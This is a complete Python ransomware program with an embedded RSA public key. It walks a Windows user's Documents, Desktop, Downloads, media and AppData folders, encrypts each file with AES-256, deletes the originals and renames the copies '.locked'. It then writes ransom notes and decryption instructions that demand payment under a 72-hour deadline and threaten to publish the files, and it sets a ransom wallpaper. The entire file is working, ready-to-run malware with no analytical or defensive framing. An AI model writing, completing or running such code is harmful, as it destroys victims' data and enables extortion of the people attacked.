import os
from pathlib import Path
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.backends import default_backend
from PIL import Image, ImageDraw, ImageFont
import ctypes
import base64
import secrets

# ============================================================================
# CONFIGURATION: PASTE YOUR RSA PUBLIC KEY HERE
# ============================================================================
RSA_PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu31rJrqooexPjBEPv/zQ
P+OGifoFvH5umlEMmw1FJDauTvo3im2wKmkWXO9C/9Tx9HHjmkF8cDQIUSVuSw8y
K2Nq7NO2lvcuYmHcfo7f4FpYUfGCqmcqt1johalaUQXxlZp04DUPZn/bHObMZBpf
IKUBJNLwR1uV0lmYFxI/3vQ9BETLCzTRN1MkMJmM3Gz/CEToSPQcxeGZduxhIGLG
TWhiBLqIm2i6U1PGo6279ztXzsEbZ4Jq4bq4rn8rQV7ps06b3G9C4ZINAqYM04+C
ohAlez3b8zNH386eORK0pM6Qtjij7CbobOms6uUZedZv5Q0R6l3N64PtaTAiG5Kt
VwIDAQAB
-----END PUBLIC KEY-----"""

# Alternative: Load from file instead of embedding
# Uncomment this section if you prefer to load from file:
"""
def load_public_key_from_file(filepath):
    with open(filepath, 'rb') as f:
        return f.read()

RSA_PUBLIC_KEY_PEM = load_public_key_from_file('public_key.pem')
"""
# ============================================================================


class AdvancedEncryptionTraversal:
    def __init__(self, max_workers=4, rsa_public_key_pem=None):
        """
        Initialize the parallel BFS traversal with AES-256 + RSA encryption.
        
        Args:
            max_workers: Number of parallel threads to use
            rsa_public_key_pem: RSA public key in PEM format (bytes)
        """
        self.max_workers = max_workers
        self.lock = threading.Lock()
        self.all_files = []
        self.encrypted_count = 0
        self.failed_count = 0
        self.skipped_count = 0
        self.backend = default_backend()
        
        # Generate random AES-256 key (32 bytes = 256 bits)
        self.aes_key = secrets.token_bytes(32)
        
        # Load RSA public key from PEM
        if rsa_public_key_pem:
            self.rsa_public_key = self.load_rsa_public_key(rsa_public_key_pem)
        else:
            raise ValueError("RSA public key is required!")
        
        # Encrypt the AES key with RSA public key
        self.encrypted_aes_key = self.encrypt_aes_key_with_rsa()
        
    def load_rsa_public_key(self, pem_data):
        """
        Load RSA public key from PEM format.
        
        Args:
            pem_data: RSA public key in PEM format (bytes or string)
            
        Returns:
            RSA public key object
        """
        try:
            # Convert to bytes if string
            if isinstance(pem_data, str):
                pem_data = pem_data.encode('utf-8')
            
            # Load public key
            public_key = serialization.load_pem_public_key(
                pem_data,
                backend=self.backend
            )
            return public_key
        except Exception as e:
            raise ValueError(f"Failed to load RSA public key: {e}")
    
    def encrypt_aes_key_with_rsa(self):
        """
        Encrypt the AES symmetric key using RSA public key.
        
        Returns:
            Encrypted AES key (bytes)
        """
        encrypted_key = self.rsa_public_key.encrypt(
            self.aes_key,
            asym_padding.OAEP(
                mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return encrypted_key
    
    def get_windows_directories(self):
        """Get the standard Windows user directories."""
        home = Path.home()
        
        directories = {
            'Documents': home / 'Documents',
            'Desktop': home / 'Desktop',            
            'Downloads': home / 'Downloads',
            'Music': home / 'Music',
            'Videos': home / 'Videos',
            'Pictures': home / 'Pictures',
            'AppData_Roaming': home / 'AppData' / 'Roaming'
        }
        
        # Filter out directories that don't exist
        existing_dirs = {}
        for name, path in directories.items():
            if path.exists():
                existing_dirs[name] = path
        
        return existing_dirs
    
    def encrypt_file_aes256(self, filepath, dir_name):
        """
        Encrypt a single file using AES-256-CBC and rename it with .locked extension.
        
        File format: [IV (16 bytes)][Encrypted Data][HMAC (32 bytes)]
        
        Args:
            filepath: Path object of the file to encrypt
            dir_name: Name of the parent directory (for logging)
            
        Returns:
            True if successful, False otherwise
        """
        try:
            # Skip already encrypted files
            if filepath.suffix == '.locked':
                with self.lock:
                    self.skipped_count += 1
                return False
            
            # Skip system files and our own files
            skip_files = [
                'RANSOM NOTE.txt', 
                'wallpaper.png', 
                'DECRYPTION_KEY.txt',
                'public_key.pem',
                'ENCRYPTED_AES_KEY.bin',
                'ENCRYPTED_AES_KEY.txt',
                'HOW_TO_DECRYPT.txt'
            ]
            if filepath.name in skip_files:
                with self.lock:
                    self.skipped_count += 1
                return False
            
            # Read file in binary mode
            with open(filepath, 'rb') as file:
                plaintext = file.read()
            
            # Generate random IV (16 bytes for AES)
            iv = secrets.token_bytes(16)
            
            # Apply PKCS7 padding
            padder = padding.PKCS7(128).padder()  # 128 bits = 16 bytes block size
            padded_data = padder.update(plaintext) + padder.finalize()
            
            # Encrypt with AES-256-CBC
            cipher = Cipher(
                algorithms.AES(self.aes_key),  # 256-bit key
                modes.CBC(iv),
                backend=self.backend
            )
            encryptor = cipher.encryptor()
            ciphertext = encryptor.update(padded_data) + encryptor.finalize()
            
            # Create HMAC for integrity verification
            from cryptography.hazmat.primitives import hmac
            h = hmac.HMAC(self.aes_key, hashes.SHA256(), backend=self.backend)
            h.update(iv + ciphertext)
            hmac_value = h.finalize()
            
            # Create new filename with .locked extension
            locked_filename = str(filepath) + '.locked'
            
            # Write encrypted file: [IV][Ciphertext][HMAC]
            with open(locked_filename, 'wb') as file:
                file.write(iv)
                file.write(ciphertext)
                file.write(hmac_value)
            
            # Delete the original file
            os.remove(filepath)
            
            with self.lock:
                self.encrypted_count += 1
            
            return True
            
        except PermissionError:
            with self.lock:
                self.failed_count += 1
            return False
        except Exception:
            with self.lock:
                self.failed_count += 1
            return False
    
    def bfs_traverse_directory(self, root_dir, dir_name):
        """
        Perform BFS traversal on a single directory and encrypt files.
        
        Args:
            root_dir: Root directory path to traverse
            dir_name: Name of the directory (for logging)
        
        Returns:
            List of all file paths found
        """
        files_found = []
        queue = deque([root_dir])
        visited = set()
        
        while queue:
            current_dir = queue.popleft()
            
            # Skip if already visited (handles symlinks)
            try:
                real_path = current_dir.resolve()
                if real_path in visited:
                    continue
                visited.add(real_path)
            except (OSError, RuntimeError):
                continue
            
            try:
                # Get all items in current directory
                items = list(current_dir.iterdir())
                
                # Separate files and directories
                for item in items:
                    try:
                        if item.is_file():
                            # Encrypt the file with AES-256
                            self.encrypt_file_aes256(item, dir_name)
                            
                            # Track the file (using new .locked name if encrypted)
                            locked_path = str(item) + '.locked'
                            if os.path.exists(locked_path):
                                files_found.append(locked_path)
                                with self.lock:
                                    self.all_files.append({
                                        'directory': dir_name,
                                        'original_path': str(item),
                                        'locked_path': locked_path,
                                        'size': os.path.getsize(locked_path)
                                    })
                            else:
                                # File wasn't encrypted (failed or skipped)
                                files_found.append(str(item))
                                with self.lock:
                                    self.all_files.append({
                                        'directory': dir_name,
                                        'original_path': str(item),
                                        'locked_path': None,
                                        'size': item.stat().st_size if item.exists() else 0
                                    })
                        elif item.is_dir():
                            # Add subdirectory to queue for BFS
                            queue.append(item)
                    except (PermissionError, OSError):
                        # Skip files/directories we can't access
                        pass
                        
            except PermissionError:
                pass
            except OSError:
                pass
        
        return files_found
    
    def traverse_all_parallel(self):
        """
        Traverse all Windows directories in parallel using BFS and encrypt files.
        
        Returns:
            Dictionary with results from each directory
        """
        directories = self.get_windows_directories()
        
        if not directories:
            return {}
        
        results = {}
        
        # Use ThreadPoolExecutor for parallel traversal
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # Submit all directory traversal tasks
            future_to_dir = {
                executor.submit(self.bfs_traverse_directory, path, name): name
                for name, path in directories.items()
            }
            
            # Collect results as they complete
            for future in as_completed(future_to_dir):
                dir_name = future_to_dir[future]
                try:
                    files = future.result()
                    results[dir_name] = files
                except Exception:
                    results[dir_name] = []
        
        return results
    
    def save_encrypted_key(self):
        """
        Save the RSA-encrypted AES key to Desktop.
        This is the key that must be decrypted to recover files.
        """
        try:
            desktop = Path.home() / 'Desktop'
            
            # Save binary version
            key_file_bin = desktop / 'ENCRYPTED_AES_KEY.bin'
            with open(key_file_bin, 'wb') as f:
                f.write(self.encrypted_aes_key)
            
            # Save base64 encoded version for easier copying
            key_file_txt = desktop / 'ENCRYPTED_AES_KEY.txt'
            with open(key_file_txt, 'w') as f:
                f.write("═" * 70 + "\n")
                f.write("RSA-ENCRYPTED AES-256 KEY\n")
                f.write("═" * 70 + "\n\n")
                f.write("This is your encrypted AES-256 key.\n")
                f.write("It has been encrypted with RSA-4096 public key.\n")
                f.write("You need the corresponding RSA private key to decrypt it.\n\n")
                f.write("Encrypted Key (Base64):\n")
                f.write("-" * 70 + "\n")
                f.write(base64.b64encode(self.encrypted_aes_key).decode())
                f.write("\n" + "-" * 70 + "\n\n")
                f.write(f"Key Size: {len(self.encrypted_aes_key)} bytes\n")
                f.write("Encryption: RSA-4096 with OAEP padding\n")
                f.write("Hash: SHA-256\n\n")
                
        except Exception:
            pass
    
    def save_results_to_file(self, filename='RANSOM NOTE.txt'):
        """Save encryption results to ransom note file."""
        try:
            desktop = Path.home() / 'Desktop'
            filepath = desktop / filename
            
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write("═" * 70 + "\n")
                f.write("YOUR FILES HAVE BEEN ENCRYPTED!\n")
                f.write("═" * 70 + "\n\n")
                
                f.write("ENCRYPTION DETAILS:\n")
                f.write("-" * 70 + "\n")
                f.write("• Algorithm: AES-256-CBC (Advanced Encryption Standard)\n")
                f.write("• Key Size: 256 bits (32 bytes)\n")
                f.write("• Key Protection: RSA-4096 asymmetric encryption\n")
                f.write("• Integrity: HMAC-SHA256 authentication\n")
                f.write("• Random IV: Unique for each file\n\n")
                
                f.write("All your important files have been encrypted with military-grade\n")
                f.write("AES-256 encryption. The encryption key itself is protected by\n")
                f.write("RSA-4096 public key cryptography.\n\n")
                
                f.write("You CANNOT decrypt your files without the RSA private key.\n\n")
                
                f.write("STATISTICS:\n")
                f.write(f"  • Total Files Encrypted: {self.encrypted_count:,}\n")
                f.write(f"  • Total Files Failed: {self.failed_count:,}\n")
                f.write(f"  • Total Files Skipped: {self.skipped_count:,}\n\n")
                
                f.write("═" * 70 + "\n")
                f.write("HOW TO DECRYPT YOUR FILES?\n")
                f.write("═" * 70 + "\n\n")
                
                f.write("IMPORTANT FILES:\n")
                f.write("  • ENCRYPTED_AES_KEY.bin - Your encrypted encryption key\n")
                f.write("  • ENCRYPTED_AES_KEY.txt - Text version of encrypted key\n")
                f.write("  • HOW_TO_DECRYPT.txt - Decryption instructions\n\n")
                
                f.write("STEPS:\n")
                f.write("1. DO NOT delete any .locked files\n")
                f.write("2. DO NOT delete ENCRYPTED_AES_KEY files\n")
                f.write("3. DO NOT attempt to decrypt files yourself\n")
                f.write("4. DO NOT rename any files\n\n")
                
                f.write("5. Contact us at: [Your Contact Info]\n")
                f.write("6. Send the ENCRYPTED_AES_KEY.txt file\n")
                f.write("7. After payment, receive RSA private key\n")
                f.write("8. Run decryption tool with private key\n\n")
                
                f.write("═" * 70 + "\n")
                f.write("TECHNICAL INFORMATION\n")
                f.write("═" * 70 + "\n\n")
                
                f.write("Encryption Process:\n")
                f.write("1. Random AES-256 key generated: 32 bytes\n")
                f.write("2. Your files encrypted with AES-256-CBC\n")
                f.write("3. Each file has unique IV (16 bytes)\n")
                f.write("4. HMAC-SHA256 for integrity\n")
                f.write("5. AES key encrypted with your RSA public key\n")
                f.write("6. Only attacker has RSA private key\n\n")
                
                f.write("File Format:\n")
                f.write("  [IV-16bytes][EncryptedData][HMAC-32bytes]\n\n")
                
                f.write("═" * 70 + "\n")
                f.write("WARNINGS\n")
                f.write("═" * 70 + "\n\n")
                
                f.write("⚠ Wrong decryption attempts will DESTROY your data!\n")
                f.write("⚠ Do not restart until you backup .locked files!\n")
                f.write("⚠ Time limit: 72 hours for payment!\n")
                f.write("⚠ After 7 days, files may be published!\n\n")
                
                f.write("═" * 70 + "\n\n")
                
                f.write("ENCRYPTED DIRECTORIES:\n")
                f.write("-" * 70 + "\n")
                
                # Group by directory
                by_directory = {}
                for file_info in self.all_files:
                    dir_name = file_info['directory']
                    if dir_name not in by_directory:
                        by_directory[dir_name] = []
                    by_directory[dir_name].append(file_info)
                
                # Write summary for each directory
                for dir_name, files in by_directory.items():
                    encrypted_in_dir = sum(1 for f in files if f['locked_path'])
                    f.write(f"\n{dir_name}: {encrypted_in_dir} files encrypted\n")
            
            # Also save to Documents folder
            documents = Path.home() / 'Documents'
            if documents.exists():
                doc_filepath = documents / filename
                with open(filepath, 'r', encoding='utf-8') as source:
                    with open(doc_filepath, 'w', encoding='utf-8') as dest:
                        dest.write(source.read())
                        
        except Exception:
            pass
    
    def save_decryption_instructions(self):
        """Save detailed decryption instructions."""
        try:
            desktop = Path.home() / 'Desktop'
            filepath = desktop / 'HOW_TO_DECRYPT.txt'
            
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write("═" * 70 + "\n")
                f.write("DECRYPTION INSTRUCTIONS\n")
                f.write("═" * 70 + "\n\n")
                
                f.write("To decrypt your files, you need:\n\n")
                
                f.write("1. The RSA private key (attacker has this)\n")
                f.write("2. The ENCRYPTED_AES_KEY.bin file (on your Desktop)\n")
                f.write("3. The decryption program (will be provided)\n\n")
                
                f.write("═" * 70 + "\n")
                f.write("DECRYPTION PROCESS\n")
                f.write("═" * 70 + "\n\n")
                
                f.write("Step 1: Obtain RSA Private Key\n")
                f.write("  - Contact the attacker\n")
                f.write("  - Complete payment\n")
                f.write("  - Receive private key file (.pem)\n\n")
                
                f.write("Step 2: Run Decryption Tool\n")
                f.write("  - python decrypt.py\n")
                f.write("  - Provide path to RSA private key\n")
                f.write("  - Provide path to ENCRYPTED_AES_KEY.bin\n")
                f.write("  - Enter password if key is encrypted\n\n")
                
                f.write("Step 3: Automatic Decryption\n")
                f.write("  - Tool will decrypt AES key\n")
                f.write("  - Find all .locked files\n")
                f.write("  - Decrypt each file\n")
                f.write("  - Verify integrity with HMAC\n")
                f.write("  - Restore original filenames\n\n")
                
                f.write("═" * 70 + "\n")
                f.write("WHAT YOU NEED TO SEND\n")
                f.write("═" * 70 + "\n\n")
                
                f.write("Send this information to the attacker:\n\n")
                f.write("1. Contents of ENCRYPTED_AES_KEY.txt\n")
                f.write("2. Your contact information\n")
                f.write("3. Payment confirmation\n\n")
                
                f.write("DO NOT:\n")
                f.write("  × Delete any .locked files\n")
                f.write("  × Delete ENCRYPTED_AES_KEY files\n")
                f.write("  × Rename any files\n")
                f.write("  × Attempt manual decryption\n\n")
                
        except Exception:
            pass


def create_wallpaper(text, output_path=None):
    """Create a wallpaper with custom text."""
    try:
        # Configuration
        width, height = 1920, 1080
        background_color = (15, 15, 15)
        text_color = (220, 20, 60)
        font_size = 80
        
        # Create blank image
        img = Image.new('RGB', (width, height), color=background_color)
        d = ImageDraw.Draw(img)
        
        # Load font
        try:
            font_paths = [
                "C:\\Windows\\Fonts\\arial.ttf",
                "C:\\Windows\\Fonts\\calibri.ttf",
                "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
                "/System/Library/Fonts/Helvetica.ttc"
            ]
            
            font = None
            for font_path in font_paths:
                if os.path.exists(font_path):
                    font = ImageFont.truetype(font_path, font_size)
                    break
            
            if font is None:
                font = ImageFont.load_default()
        except Exception:
            font = ImageFont.load_default()
        
        # Split text into lines
        lines = text.split('\n')
        
        # Calculate total text height
        line_heights = []
        for line in lines:
            bbox = d.textbbox((0, 0), line, font=font)
            line_heights.append(bbox[3] - bbox[1])
        
        total_height = sum(line_heights) + (len(lines) - 1) * 20
        y_position = (height - total_height) / 2
        
        # Draw each line centered
        for i, line in enumerate(lines):
            bbox = d.textbbox((0, 0), line, font=font)
            text_width = bbox[2] - bbox[0]
            x_position = (width - text_width) / 2
            
            d.text((x_position, y_position), line, fill=text_color, font=font)
            y_position += line_heights[i] + 20
        
        # Set output path
        if output_path is None:
            desktop = Path.home() / 'Desktop'
            output_path = desktop / 'wallpaper.png'
        
        # Save image
        img.save(output_path)
        return os.path.abspath(str(output_path))
        
    except Exception:
        return None


def set_wallpaper(image_path):
    """Set Windows desktop wallpaper."""
    try:
        if os.name == 'nt':
            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
    except Exception:
        pass


def main():
    """Main function - automated AES-256 + RSA encryption with embedded public key."""
    
    # Create encryption instance with embedded RSA public key
    try:
        encryptor = AdvancedEncryptionTraversal(
            max_workers=4,
            rsa_public_key_pem=RSA_PUBLIC_KEY_PEM
        )
    except ValueError as e:
        print(f"Error: {e}")
        print("\nPlease paste your RSA public key in PEM format at the top of this script.")
        print("Look for the RSA_PUBLIC_KEY_PEM variable.")
        return
    
    # Save the RSA-encrypted AES key
    encryptor.save_encrypted_key()
    
    # Perform parallel traversal and encryption
    results = encryptor.traverse_all_parallel()
    
    # Save ransom note and instructions
    encryptor.save_results_to_file('RANSOM NOTE.txt')
    encryptor.save_decryption_instructions()
    
    # Create and set wallpaper
    wallpaper_text = "YOUR FILES ARE ENCRYPTED!\n\nAES-256 + RSA-4096\n\nRead RANSOM NOTE.txt on Desktop"
    wallpaper_path = create_wallpaper(wallpaper_text)
    
    if wallpaper_path:
        set_wallpaper(wallpaper_path)


if __name__ == "__main__":
    main()
